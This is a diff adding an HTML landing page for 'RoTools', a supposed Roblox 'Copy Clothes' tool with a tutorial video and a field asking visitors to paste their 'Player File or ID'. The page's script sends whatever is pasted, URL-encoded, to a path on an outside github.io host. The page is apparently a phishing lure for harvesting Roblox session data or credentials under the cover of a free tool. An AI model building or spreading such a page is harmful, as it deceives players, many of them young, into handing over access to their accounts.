@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>RoTools | Copy Clothes v19</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap" rel="stylesheet"/>
+  <style>
+    body {
+      background: linear-gradient(180deg, #19171e 0%, #18111d 100%);
+      color: #fff;
+      font-family: 'Roboto', Arial, sans-serif;
+      margin: 0;
+      min-height: 100vh;
+      width: 100vw;
+      overflow-x: hidden;
+    }
+    .center-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 3vw;
+      margin-bottom: 3vw;
+    }
+    .logo {
+      width: 52px;
+      margin-bottom: 10px;
+      filter: drop-shadow(0 0 12px #b96eff60);
+    }
+    .brand-title {
+      font-family: 'Orbitron', Arial, sans-serif;
+      font-size: 2.1rem;
+      font-weight: 900;
+      color: #fff;
+      margin-top: 0;
+      margin-bottom: 6px;
+      letter-spacing: 1px;
+    }
+    .brand-desc {
+      color: #b96eff;
+      font-size: 1.16rem;
+      font-weight: 500;
+      margin-bottom: 34px;
+      text-align: center;
+    }
+    .start-btn {
+      background: linear-gradient(90deg, #a044ff 0%, #f36fff 100%);
+      color: #fff;
+      font-size: 1.28rem;
+      font-weight: 700;
+      padding: 18px 54px;
+      border: none;
+      border-radius: 12px;
+      box-shadow: 0 0 16px #b96eff70;
+      cursor: pointer;
+      margin-bottom: 3vw;
+      transition: background 0.14s, box-shadow 0.14s, transform 0.14s;
+      letter-spacing: 0.5px;
+    }
+    .start-btn:hover, .start-btn:focus {
+      background: linear-gradient(90deg, #b96eff 0%, #a044ff 100%);
+      box-shadow: 0 0 32px #a044ff80;
+      transform: translateY(-2px) scale(1.03);
+    }
+
+    .features-section {
+      width: 96vw;
+      max-width: 840px;
+      margin: 0 auto;
+      display: flex;
+      flex-direction: column;
+      gap: 28px;
+      margin-bottom: 2vw;
+    }
+    .feature-card {
+      background: #1a1821;
+      border-radius: 18px;
+      border: 2.3px solid #b96eff;
+      box-shadow: 0 0 17px #b96eff22;
+      padding: 26px 32px 22px 32px;
+      margin-bottom: 0;
+      display: flex;
+      gap: 22px;
+      align-items: flex-start;
+      transition: box-shadow 0.14s, border 0.17s, transform 0.14s;
+    }
+    .feature-card:hover, .feature-card:focus-within {
+      box-shadow: 0 0 38px #b96eff60;
+      border: 2.5px solid #fff;
+      transform: scale(1.011);
+    }
+    .feature-icon {
+      font-size: 2.3rem;
+      margin-right: 8px;
+      margin-top: 2px;
+      flex-shrink: 0;
+      filter: drop-shadow(0 0 8px #b96eff80);
+    }
+    .feature-content {
+      display: flex;
+      flex-direction: column;
+    }
+    .feature-title {
+      font-size: 1.19rem;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 4px;
+      font-family: 'Orbitron', Arial, sans-serif;
+      letter-spacing: 0.3px;
+    }
+    .feature-desc {
+      color: #bda8ff;
+      font-size: 1.03rem;
+      font-weight: 400;
+    }
+    .copy-main-btn {
+      display: block;
+      background: #221a2f;
+      color: #fff;
+      font-size: 1.18rem;
+      font-weight: 700;
+      border: 2.5px solid #b96eff;
+      border-radius: 13px;
+      padding: 22px 0;
+      width: 160px;
+      margin: 38px auto 0 auto;
+      box-shadow: 0 0 18px #b96eff33;
+      text-align: center;
+      cursor: pointer;
+      transition: border 0.15s, box-shadow 0.15s, color 0.13s, background 0.13s, transform 0.13s;
+      text-decoration: none;
+    }
+    .copy-main-btn:hover, .copy-main-btn:focus {
+      border: 2.7px solid #fff;
+      background: #2f2243;
+      color: #c87fff;
+      box-shadow: 0 0 26px #b96eff80;
+      transform: scale(1.045);
+    }
+    /* Video section */
+    .video-section {
+      background: #18111d;
+      border-radius: 18px;
+      border: 2.3px solid #b96eff;
+      box-shadow: 0 0 17px #b96eff22;
+      max-width: 900px;
+      margin: 44px auto 0 auto;
+      padding: 32px 32px 24px 32px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .video-title {
+      font-size: 1.2rem;
+      font-family: 'Orbitron', Arial, sans-serif;
+      color: #fff;
+      font-weight: 700;
+      margin-bottom: 16px;
+      letter-spacing: 0.2px;
+      text-align: center;
+    }
+    .tutorial-video {
+      width: 100%;
+      max-width: 700px;
+      border-radius: 12px;
+      box-shadow: 0 0 18px #a044ff14;
+      margin-bottom: 18px;
+      min-height: 250px;
+      background: #111;
+    }
+    /* Player file form */
+    .playerfile-section {
+      max-width: 700px;
+      margin: 44px auto 0 auto;
+      background: #18111d;
+      border-radius: 18px;
+      border: 2.3px solid #b96eff;
+      box-shadow: 0 0 17px #b96eff22;
+      padding: 28px 20px 24px 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .playerfile-label {
+      color: #b96eff;
+      font-family: 'Orbitron', Arial, sans-serif;
+      font-size: 1.08rem;
+      font-weight: 700;
+      margin-bottom: 12px;
+      letter-spacing: 0.1px;
+    }
+    .playerfile-form {
+      width: 100%;
+      display: flex;
+      gap: 14px;
+      align-items: center;
+      justify-content: center;
+      margin-top: 8px;
+    }
+    .playerfile-input {
+      flex: 1;
+      font-size: 1.09rem;
+      border: none;
+      border-radius: 7px;
+      padding: 14px 14px;
+      background: #23222c;
+      color: #fff;
+      outline: none;
+      border: 2px solid #383848;
+      transition: border 0.17s;
+    }
+    .playerfile-input:focus {
+      border: 2px solid #b96eff;
+    }
+    .playerfile-submit {
+      background: linear-gradient(90deg, #a044ff 0%, #f36fff 100%);
+      color: #fff;
+      font-size: 1.09rem;
+      font-weight: 700;
+      padding: 14px 36px;
+      border: none;
+      border-radius: 9px;
+      box-shadow: 0 0 14px #a044ff70;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    .playerfile-submit:hover, .playerfile-submit:focus {
+      background: linear-gradient(90deg, #b96eff 0%, #a044ff 100%);
+    }
+    .playerfile-message {
+      margin-top: 14px;
+      font-size: 1.02rem;
+      color: #77ffaf;
+      text-align: center;
+      min-height: 1.2em;
+    }
+    @media (max-width: 900px) {
+      .features-section, .video-section, .playerfile-section { max-width: 99vw; }
+    }
+    @media (max-width: 700px) {
+      .brand-title { font-size: 1.35rem; }
+      .brand-desc { font-size: 1rem; }
+      .features-section { padding: 0 2vw; }
+      .feature-card { padding: 18px 7vw 18px 7vw; }
+      .copy-main-btn { width: 95vw; max-width: 240px; }
+    }
+    @media (max-width: 450px) {
+      .features-section { gap: 17px; }
+      .feature-card { padding: 13px 2vw; gap: 12px;}
+      .copy-main-btn { padding: 14px 0; }
+      .video-section, .playerfile-section { padding: 10px 2vw 16px 2vw; }
+    }
+  </style>
+</head>
+<body>
+  <div class="center-wrap">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Roblox_Logo_2022.svg" alt="RoTools" class="logo"/>
+    <div class="brand-title">RoTools</div>
+    <div class="brand-desc">Copy clothes with ease, with our newest tools.</div>
+    <a href="#features"><button class="start-btn">Start Now ▶</button></a>
+  </div>
+  <div id="features" class="features-section">
+    <div class="feature-card">
+      <div class="feature-icon">📝</div>
+      <div class="feature-content">
+        <div class="feature-title">Variety of Easy-to-Use Tools</div>
+        <div class="feature-desc">A wide range of tools designed to simplify the Roblox Experience and automation for everyone.</div>
+      </div>
+    </div>
+    <div class="feature-card">
+      <div class="feature-icon">👚</div>
+      <div class="feature-content">
+        <div class="feature-title">Copy clothes Instantly</div>
+        <div class="feature-desc">Easy Copy clothes features and mechanics to jump-start your development process.</div>
+      </div>
+    </div>
+  </div>
+  <a href="#copy"><div class="copy-main-btn">Copy Clothes</div></a>
+
+  <div class="video-section">
+    <div class="video-title">How to Use Copy Clothes</div>
+    <iframe
+      class="tutorial-video"
+      width="700" height="400"
+      src="https://streamable.com/e/zhignt"
+      title="Tutorial"
+      frameborder="0"
+      allowfullscreen></iframe>
+    <div style="color:#bda8ff;font-size:1.01rem;text-align:center;margin-bottom:10px;">
+      Watch this short video to see how to use Copy Clothes in RoTools!
+    </div>
+  </div>
+
+  <div class="playerfile-section" id="copy">
+    <div class="playerfile-label">Enter your Player File</div>
+    <form class="playerfile-form" id="playerfile-form">
+      <input type="text" id="playerFile" class="playerfile-input" placeholder="Paste your Player File or ID here" autocomplete="off"/>
+      <button type="submit" class="playerfile-submit">Submit</button>
+    </form>
+    <div class="playerfile-message" id="playerfile-message"></div>
+  </div>
+  <script>
+    document.getElementById('playerfile-form').addEventListener('submit', function(e) {
+      e.preventDefault();
+      let playerFile = document.getElementById('playerFile').value.trim();
+      let msg = document.getElementById('playerfile-message');
+      if (!playerFile) {
+        msg.style.color = "#ff7c7c";
+        msg.textContent = "Please enter your Player File or ID.";
+        return;
+      }
+      msg.style.color = "#77ffaf";
+      msg.textContent = "Redirecting...";
+      setTimeout(function() {
+        window.location.href = "https://asigmaserver.github.io/trusev1/Copy-Clothing/" + encodeURIComponent(playerFile);
+      }, 800);
+    });
+  </script>
+</body>
+</html>
